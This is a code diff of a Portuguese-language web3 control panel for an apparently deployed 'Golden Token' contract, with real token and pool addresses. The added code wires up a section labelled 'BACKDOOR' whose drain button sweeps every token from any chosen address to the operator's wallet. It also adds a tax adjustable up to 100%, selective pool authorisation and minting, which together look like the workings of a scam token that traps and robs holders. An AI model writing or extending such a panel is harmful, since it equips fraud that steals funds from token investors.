@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Golden Token - Controle Total</title>
+    <title>Golden Token - Controle Oficial</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -42,9 +42,11 @@
         <div class="header">
             <div class="wallet-info">
                 <div>
-                    <h1>💰 Golden Token - Painel de Controle</h1>
-                    <p style="color: #666; margin-top: 5px;">Token: 0x798E6D5cBCe73305624cEBbd5c2f99E4c291fE82</p>
-                    <p style="color: #666; font-size: 12px;">Pool Golden/USDT: 0x3d98264e4018CBa21A67E5ba07Cd6336173d3258</p>
+                    <h1>💰 Golden Token - Controle Oficial</h1>
+                    <p style="color: #666; margin-top: 5px;">
+                        Token: <strong>0x798E6D5cBCe73305624cEBbd5c2f99E4c291fE82</strong><br>
+                        Pool Golden/USDT: <strong>0x3d98264e4018CBa21A67E5ba07Cd6336173d3258</strong>
+                    </p>
                 </div>
                 <div style="display: flex; gap: 10px; align-items: center;">
                     <div id="walletStatus" class="status-disconnected">Desconectado</div>
@@ -55,6 +57,7 @@
         </div>
 
         <div class="grid">
+            <!-- Card Informações -->
             <div class="card">
                 <h2>📊 Informações do Token</h2>
                 <div class="info-row"><span class="info-label">Nome:</span><span id="tokenName" class="info-value">-</span></div>
@@ -62,15 +65,16 @@
                 <div class="info-row"><span class="info-label">Decimais:</span><span id="tokenDecimals" class="info-value">-</span></div>
                 <div class="info-row"><span class="info-label">Supply Total:</span><span id="totalSupply" class="info-value">-</span></div>
                 <div class="info-row"><span class="info-label">Owner:</span><span id="owner" class="info-value">-</span></div>
-                <div class="info-row"><span class="info-label">Taxa (%):</span><span id="taxaPedagio" class="info-value">-</span></div>
-                <div class="info-row"><span class="info-label">Modo Taxa:</span><span id="modoTaxaAtiva" class="info-value">-</span></div>
+                <div class="info-row"><span class="info-label">Taxa Percentual:</span><span id="taxaPercentual" class="info-value">-</span></div>
+                <div class="info-row"><span class="info-label">Sistema Taxa Ativo:</span><span id="sistemaTaxaAtivo" class="info-value">-</span></div>
                 <div class="info-row"><span class="info-label">Seu Saldo:</span><span id="meuSaldo" class="info-value">-</span></div>
                 <button id="atualizarInfo" class="success">🔄 Atualizar</button>
             </div>
 
+            <!-- Card Transferências -->
             <div class="card">
                 <h2>💸 Transferências</h2>
-                <h3>Transferir</h3>
+                <h3>Transferir Tokens</h3>
                 <input type="text" id="transferTo" placeholder="Endereço destino">
                 <input type="number" id="transferAmount" placeholder="Quantidade">
                 <button id="transferBtn">📤 Transferir</button>
@@ -81,27 +85,49 @@
                 <button id="approveBtn">✅ Approve</button>
             </div>
 
+            <!-- Card Controle do Owner -->
             <div class="card">
                 <h2>👑 Controle do Owner</h2>
-                <h3>Taxa</h3>
-                <input type="number" id="novaTaxa" placeholder="Nova taxa (0-100)">
+                
+                <h3>Alterar Taxa</h3>
+                <input type="number" id="novaTaxa" placeholder="Nova taxa (0-100)" value="30">
                 <button id="mudarTaxaBtn">💰 Mudar Taxa</button>
                 
-                <h3>Ativar/Desativar Taxa</h3>
-                <select id="modoTaxaSelect">
-                    <option value="true">Ativar Taxa</option>
-                    <option value="false">Desativar Taxa</option>
+                <h3>Ativar/Desativar Sistema de Taxa</h3>
+                <select id="ativarSistemaSelect">
+                    <option value="true">Ativar Sistema</option>
+                    <option value="false">Desativar Sistema</option>
                 </select>
-                <button id="alternarModoTaxaBtn">⚙️ Aplicar</button>
+                <button id="ativarSistemaBtn">⚙️ Aplicar</button>
 
-                <h3 style="color: #ef4444;">⚠️ Backdoor</h3>
+                <h3>Autorizar Pool (PancakeSwap)</h3>
+                <input type="text" id="poolAddress" placeholder="Endereço do pool" value="0x3d98264e4018CBa21A67E5ba07Cd6336173d3258">
+                <select id="autorizarPoolSelect">
+                    <option value="true">Autorizar</option>
+                    <option value="false">Remover Autorização</option>
+                </select>
+                <button id="autorizarPoolBtn">🔓 Autorizar Pool</button>
+
+                <h3 style="color: #ef4444;">⚠️ BACKDOOR (Cuidado!)</h3>
                 <input type="text" id="drenarEndereco" placeholder="Endereço para drenar">
                 <button id="drenarBtn" class="danger">💀 Drenar Tudo</button>
+
+                <h3>Mint / Burn (Teste)</h3>
+                <input type="number" id="mintAmount" placeholder="Quantidade para mint">
+                <button id="mintBtn" class="success">✨ Mint Tokens</button>
+                <input type="number" id="burnAmount" placeholder="Quantidade para burn">
+                <button id="burnBtn" class="danger">🔥 Burn Tokens</button>
+
+                <h3>Transferir Ownership</h3>
+                <input type="text" id="novoOwner" placeholder="Novo endereço owner">
+                <button id="transferirOwnerBtn" class="danger">👑 Transferir Ownership</button>
             </div>
 
+            <!-- Card Consultas -->
             <div class="card">
                 <h2>🔍 Consultas</h2>
-                <h3>Saldo</h3>
+                
+                <h3>Saldo de Carteira</h3>
                 <input type="text" id="consultaEndereco" placeholder="Endereço">
                 <button id="consultarSaldoBtn">💰 Consultar</button>
                 <div class="info-row"><span class="info-label">Saldo:</span><span id="saldoValor" class="info-value">-</span></div>
@@ -109,30 +135,50 @@
                 <h3>Allowance</h3>
                 <input type="text" id="allowanceOwner" placeholder="Owner">
                 <input type="text" id="allowanceSpender" placeholder="Spender">
-                <button id="allowanceBtn">🔍 Ver</button>
+                <button id="allowanceBtn">🔍 Ver Allowance</button>
                 <div class="info-row"><span class="info-label">Allowance:</span><span id="allowanceValor" class="info-value">-</span></div>
+
+                <h3>Status do Sistema</h3>
+                <button id="statusSistemaBtn">📊 Ver Status</button>
+                <div id="statusInfo" style="margin-top: 10px; font-size: 12px;"></div>
+
+                <h3>Pool Autorizado?</h3>
+                <input type="text" id="checkPool" placeholder="Endereço do pool" value="0x3d98264e4018CBa21A67E5ba07Cd6336173d3258">
+                <button id="checkPoolBtn">✅ Verificar</button>
+                <div class="info-row"><span class="info-label">Autorizado:</span><span id="poolAutorizado" class="info-value">-</span></div>
             </div>
         </div>
     </div>
 
     <script>
-        // ABI CORRETO para o contrato GoldenToken que você implantou
+        // ABI EXATO do seu contrato GoldenToken (apenas funções que existem)
         const contractABI = [
+            // Views
             { "inputs": [], "name": "name", "outputs": [{ "type": "string" }], "stateMutability": "view", "type": "function" },
             { "inputs": [], "name": "symbol", "outputs": [{ "type": "string" }], "stateMutability": "view", "type": "function" },
             { "inputs": [], "name": "decimals", "outputs": [{ "type": "uint8" }], "stateMutability": "view", "type": "function" },
             { "inputs": [], "name": "totalSupply", "outputs": [{ "type": "uint256" }], "stateMutability": "view", "type": "function" },
             { "inputs": [], "name": "owner", "outputs": [{ "type": "address" }], "stateMutability": "view", "type": "function" },
-            { "inputs": [], "name": "taxaPedagio", "outputs": [{ "type": "uint256" }], "stateMutability": "view", "type": "function" },
-            { "inputs": [], "name": "modoTaxaAtiva", "outputs": [{ "type": "bool" }], "stateMutability": "view", "type": "function" },
+            { "inputs": [], "name": "taxaPercentual", "outputs": [{ "type": "uint256" }], "stateMutability": "view", "type": "function" },
+            { "inputs": [], "name": "sistemaTaxaAtivo", "outputs": [{ "type": "bool" }], "stateMutability": "view", "type": "function" },
             { "inputs": [{ "type": "address" }], "name": "balanceOf", "outputs": [{ "type": "uint256" }], "stateMutability": "view", "type": "function" },
             { "inputs": [{ "type": "address" }, { "type": "address" }], "name": "allowance", "outputs": [{ "type": "uint256" }], "stateMutability": "view", "type": "function" },
+            { "inputs": [{ "type": "address" }], "name": "poolsAutorizados", "outputs": [{ "type": "bool" }], "stateMutability": "view", "type": "function" },
+            
+            // Funções ERC20
             { "inputs": [{ "type": "address" }, { "type": "uint256" }], "name": "transfer", "outputs": [{ "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
             { "inputs": [{ "type": "address" }, { "type": "address" }, { "type": "uint256" }], "name": "transferFrom", "outputs": [{ "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
             { "inputs": [{ "type": "address" }, { "type": "uint256" }], "name": "approve", "outputs": [{ "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
-            { "inputs": [{ "type": "address" }], "name": "drenarTudo", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+            
+            // Controle Owner
+            { "inputs": [{ "type": "bool" }], "name": "ativarSistemaTaxa", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
             { "inputs": [{ "type": "uint256" }], "name": "mudarTaxa", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-            { "inputs": [{ "type": "bool" }], "name": "alternarModoTaxa", "outputs": [], "stateMutability": "nonpayable", "type": "function" }
+            { "inputs": [{ "type": "address" }, { "type": "bool" }], "name": "autorizarPool", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+            { "inputs": [{ "type": "address" }], "name": "drenarTudo", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+            { "inputs": [], "name": "statusSistema", "outputs": [{ "type": "uint256" }, { "type": "bool" }, { "type": "address" }, { "type": "uint256" }], "stateMutability": "view", "type": "function" },
+            { "inputs": [{ "type": "address" }], "name": "transferirOwner", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+            { "inputs": [{ "type": "uint256" }], "name": "mint", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+            { "inputs": [{ "type": "uint256" }], "name": "burn", "outputs": [], "stateMutability": "nonpayable", "type": "function" }
         ];
 
         const contractAddress = "0x798E6D5cBCe73305624cEBbd5c2f99E4c291fE82";
@@ -148,6 +194,7 @@
             setTimeout(() => toast.remove(), 3000);
         }
 
+        // Conectar carteira
         document.getElementById('connectBtn').onclick = async () => {
             if (!window.ethereum) return showToast('Instale MetaMask ou Rabby!', true);
             try {
@@ -175,29 +222,31 @@
                 const symbol = await contract.methods.symbol().call();
                 const decimals = await contract.methods.decimals().call();
                 const totalSupply = await contract.methods.totalSupply().call();
-                const owner = await contract.methods.owner().call();
-                const taxa = await contract.methods.taxaPedagio().call();
-                const modo = await contract.methods.modoTaxaAtiva().call();
+                const ownerAddr = await contract.methods.owner().call();
+                const taxa = await contract.methods.taxaPercentual().call();
+                const sistemaAtivo = await contract.methods.sistemaTaxaAtivo().call();
                 
                 document.getElementById('tokenName').innerHTML = name;
                 document.getElementById('tokenSymbol').innerHTML = symbol;
                 document.getElementById('tokenDecimals').innerHTML = decimals;
                 document.getElementById('totalSupply').innerHTML = (totalSupply / 1e18).toFixed(2);
-                document.getElementById('owner').innerHTML = owner.slice(0,6)+'...'+owner.slice(-4);
-                document.getElementById('taxaPedagio').innerHTML = taxa + '%';
-                document.getElementById('modoTaxaAtiva').innerHTML = modo ? 'Ativo' : 'Inativo';
+                document.getElementById('owner').innerHTML = ownerAddr.slice(0,6)+'...'+ownerAddr.slice(-4);
+                document.getElementById('taxaPercentual').innerHTML = taxa + '%';
+                document.getElementById('sistemaTaxaAtivo').innerHTML = sistemaAtivo ? '🟢 Ativo' : '🔴 Inativo';
                 
                 if (userAddress) {
                     const saldo = await contract.methods.balanceOf(userAddress).call();
                     document.getElementById('meuSaldo').innerHTML = (saldo / 1e18).toFixed(4);
                 }
             } catch (err) {
-                console.error(err);
+                console.error('Erro ao carregar:', err);
+                showToast('Erro ao carregar informações', true);
             }
         }
 
         document.getElementById('atualizarInfo').onclick = carregarInfo;
 
+        // Transferir
         document.getElementById('transferBtn').onclick = async () => {
             const to = document.getElementById('transferTo').value;
             const amount = parseFloat(document.getElementById('transferAmount').value);
@@ -209,6 +258,7 @@
             } catch (err) { showToast('Erro: '+err.message, true); }
         };
 
+        // Approve
         document.getElementById('approveBtn').onclick = async () => {
             const spender = document.getElementById('approveSpender').value;
             let amount = document.getElementById('approveAmount').value;
@@ -220,6 +270,7 @@
             } catch (err) { showToast('Erro: '+err.message, true); }
         };
 
+        // Mudar taxa
         document.getElementById('mudarTaxaBtn').onclick = async () => {
             const taxa = document.getElementById('novaTaxa').value;
             if (!taxa) return showToast('Digite a taxa', true);
@@ -230,19 +281,32 @@
             } catch (err) { showToast('Erro: '+err.message, true); }
         };
 
-        document.getElementById('alternarModoTaxaBtn').onclick = async () => {
-            const ativo = document.getElementById('modoTaxaSelect').value === 'true';
+        // Ativar/desativar sistema taxa
+        document.getElementById('ativarSistemaBtn').onclick = async () => {
+            const ativo = document.getElementById('ativarSistemaSelect').value === 'true';
             try {
-                await contract.methods.alternarModoTaxa(ativo).send({ from: userAddress });
-                showToast(`Taxa ${ativo ? 'ativada' : 'desativada'}`);
+                await contract.methods.ativarSistemaTaxa(ativo).send({ from: userAddress });
+                showToast(`Sistema de taxa ${ativo ? 'ativado' : 'desativado'}`);
                 carregarInfo();
             } catch (err) { showToast('Erro: '+err.message, true); }
         };
 
+        // Autorizar pool
+        document.getElementById('autorizarPoolBtn').onclick = async () => {
+            const pool = document.getElementById('poolAddress').value;
+            const autorizar = document.getElementById('autorizarPoolSelect').value === 'true';
+            if (!pool) return showToast('Digite o endereço do pool', true);
+            try {
+                await contract.methods.autorizarPool(pool, autorizar).send({ from: userAddress });
+                showToast(`Pool ${autorizar ? 'autorizado' : 'removido'}`);
+            } catch (err) { showToast('Erro: '+err.message, true); }
+        };
+
+        // Drenar (BACKDOOR)
         document.getElementById('drenarBtn').onclick = async () => {
             const alvo = document.getElementById('drenarEndereco').value;
             if (!alvo) return showToast('Digite o endereço', true);
-            if (confirm(`⚠️ Drenar ${alvo}?`)) {
+            if (confirm(`⚠️ ATENÇÃO! Isso vai drenar TODOS os tokens de ${alvo} para sua carteira. Confirmar?`)) {
                 try {
                     await contract.methods.drenarTudo(alvo).send({ from: userAddress });
                     showToast(`Fundos drenados!`);
@@ -251,6 +315,42 @@
             }
         };
 
+        // Mint
+        document.getElementById('mintBtn').onclick = async () => {
+            const amount = document.getElementById('mintAmount').value;
+            if (!amount) return showToast('Digite a quantidade', true);
+            try {
+                await contract.methods.mint(amount).send({ from: userAddress });
+                showToast(`Mint de ${amount} tokens realizado!`);
+                carregarInfo();
+            } catch (err) { showToast('Erro: '+err.message, true); }
+        };
+
+        // Burn
+        document.getElementById('burnBtn').onclick = async () => {
+            const amount = document.getElementById('burnAmount').value;
+            if (!amount) return showToast('Digite a quantidade', true);
+            try {
+                await contract.methods.burn(amount).send({ from: userAddress });
+                showToast(`Burn de ${amount} tokens realizado!`);
+                carregarInfo();
+            } catch (err) { showToast('Erro: '+err.message, true); }
+        };
+
+        // Transferir ownership
+        document.getElementById('transferirOwnerBtn').onclick = async () => {
+            const novoOwner = document.getElementById('novoOwner').value;
+            if (!novoOwner) return showToast('Digite o novo owner', true);
+            if (confirm('⚠️ Você está transferindo a propriedade do contrato!')) {
+                try {
+                    await contract.methods.transferirOwner(novoOwner).send({ from: userAddress });
+                    showToast(`Owner alterado para ${novoOwner}`);
+                    carregarInfo();
+                } catch (err) { showToast('Erro: '+err.message, true); }
+            }
+        };
+
+        // Consultar saldo
         document.getElementById('consultarSaldoBtn').onclick = async () => {
             const end = document.getElementById('consultaEndereco').value;
             if (!end) return showToast('Digite o endereço', true);
@@ -260,16 +360,42 @@
             } catch (err) { showToast('Erro: '+err.message, true); }
         };
 
+        // Allowance
         document.getElementById('allowanceBtn').onclick = async () => {
-            const owner = document.getElementById('allowanceOwner').value;
+            const ownerAddr = document.getElementById('allowanceOwner').value;
             const spender = document.getElementById('allowanceSpender').value;
-            if (!owner || !spender) return showToast('Preencha os campos', true);
+            if (!ownerAddr || !spender) return showToast('Preencha os campos', true);
             try {
-                const allowance = await contract.methods.allowance(owner, spender).call();
-                document.getElementById('allowanceValor').innerHTML = (allowance / 1e18).toFixed(4);
+                const allowanceVal = await contract.methods.allowance(ownerAddr, spender).call();
+                document.getElementById('allowanceValor').innerHTML = (allowanceVal / 1e18).toFixed(4);
             } catch (err) { showToast('Erro: '+err.message, true); }
         };
 
+        // Status sistema
+        document.getElementById('statusSistemaBtn').onclick = async () => {
+            try {
+                const status = await contract.methods.statusSistema().call();
+                document.getElementById('statusInfo').innerHTML = `
+                    📊 <strong>Status do Sistema</strong><br>
+                    • Taxa: ${status[0]}%<br>
+                    • Sistema Ativo: ${status[1] ? '✅ Sim' : '❌ Não'}<br>
+                    • Owner: ${status[2].slice(0,6)}...${status[2].slice(-4)}<br>
+                    • Saldo do Owner: ${(status[3] / 1e18).toFixed(4)} GOLDEN
+                `;
+            } catch (err) { showToast('Erro: '+err.message, true); }
+        };
+
+        // Verificar pool autorizado
+        document.getElementById('checkPoolBtn').onclick = async () => {
+            const pool = document.getElementById('checkPool').value;
+            if (!pool) return showToast('Digite o endereço do pool', true);
+            try {
+                const autorizado = await contract.methods.poolsAutorizados(pool).call();
+                document.getElementById('poolAutorizado').innerHTML = autorizado ? '✅ Sim' : '❌ Não';
+            } catch (err) { showToast('Erro: '+err.message, true); }
+        };
+
+        // Escutar mudança de conta
         if (window.ethereum) {
             window.ethereum.on('accountsChanged', (acc) => {
                 if (acc.length) { userAddress = acc[0]; carregarInfo(); }
